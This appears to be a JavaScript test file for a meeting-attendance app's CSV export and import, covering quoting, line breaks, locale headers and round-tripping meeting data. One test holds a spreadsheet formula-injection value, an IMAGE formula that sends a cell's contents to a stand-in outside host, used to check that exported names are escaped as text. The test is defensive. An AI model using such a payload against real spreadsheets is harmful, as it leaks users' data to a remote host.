/**
 * Reading a file this app did not write as a JSON backup.
 *
 * The CSV is the awkward one: it is the only export a person opens in a spreadsheet, and the only
 * one that comes back in again. So the row shape is a contract between the dashboard and this
 * module, and what these pin down is that the contract survives a round trip — including the names
 * a spreadsheet would rather run than read.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { csvRow, parseCSV, fromOwnCSV, configureLocaleLabels } from '../src/lib/importers.js';

const catalogue = (code) =>
  JSON.parse(readFileSync(new URL(`../_locales/${code}/messages.json`, import.meta.url), 'utf8'));

/** The real message catalogues, the same way the pages hand them over at startup. */
const tables = {};
for (const code of ['en', 'pl']) {
  const messages = catalogue(code);
  tables[code] = Object.fromEntries(Object.entries(messages).map(([k, v]) => [k, v.message]));
}
configureLocaleLabels(tables);

const L = (key, code = 'en') => tables[code][key];

/** A file with the columns fromOwnCSV needs, written the way downloadCSV writes one. */
function file(rows, code = 'en') {
  const header = [L('colDate', code), L('colMeeting', code), L('csvMeetingCode', code),
    L('colParticipant', code), L('csvEmail', code), L('csvSessionList', code), L('csvId', code)];
  return [header, ...rows].map(csvRow).join('\r\n');
}
const row = (name, extra = {}) => ['2026-08-14', extra.title || 'Standup', 'abc-defg-hij',
  name, extra.email || '', JSON.stringify(['09:00–10:00']), 'abc-defg-hij-1000'];

/* ---------------------------- the format itself ---------------------------- */

test('a cell keeps what was in it, commas and quotes included', () => {
  const text = csvRow(['Kowalska, Anna', 'She said "hello"', '']);
  assert.equal(text, '"Kowalska, Anna","She said ""hello""",""');
  assert.deepEqual(parseCSV(text), [['Kowalska, Anna', 'She said "hello"', '']]);
});

test('a quoted cell may hold a line break', () => {
  assert.deepEqual(parseCSV('"a\r\nb",c\r\nd,e'), [['a\r\nb', 'c'], ['d', 'e']]);
});

/* ---------------------------- names a spreadsheet would run ---------------------------- */

test('a name that would read as a formula is written as text and imported back whole', () => {
  const hostile = '=IMAGE("http://example.invalid/"&A1)';
  const text = file([row(hostile)]);

  assert.ok(text.includes(`"'${hostile.replace(/"/g, '""')}"`),
    'the spreadsheet is told to read the name, not to run it');

  const { meetings } = fromOwnCSV(text);
  assert.deepEqual(Object.keys(meetings[0].attendance), [hostile],
    'and the file still names the person it was written from');
});

test('a name that merely starts with an apostrophe comes back as itself', () => {
  const quoted = "'Anna";
  const { meetings } = fromOwnCSV(file([row(quoted)]));
  assert.deepEqual(Object.keys(meetings[0].attendance), [quoted]);
});

/* ---------------------------- what the round trip carries ---------------------------- */

test('a meeting keeps its id, so importing a file you already have adds nothing', () => {
  const { meetings } = fromOwnCSV(file([row('Anna Kowalska', { email: 'anna@example.com' })]));
  const [m] = meetings;

  assert.equal(m.id, 'abc-defg-hij-1000');
  assert.equal(m.meetingCode, 'abc-defg-hij');
  assert.equal(m.meetingTitle, 'Standup');
  assert.equal(m.attendance['Anna Kowalska'].email, 'anna@example.com');
  assert.equal(m.attendance['Anna Kowalska'].totalSeconds, 3600, 'an hour, read off the presence ranges');
});

test('a file exported in the other language reads the same', () => {
  const { meetings } = fromOwnCSV(file([row('Anna Kowalska')], 'pl'));
  assert.deepEqual(Object.keys(meetings[0].attendance), ['Anna Kowalska']);
});

test('a file that is not one of ours is refused rather than guessed at', () => {
  assert.throws(() => fromOwnCSV('name,age\r\nAnna,30'), /no participant header/);
  assert.throws(() => fromOwnCSV(''), /empty file/);
});
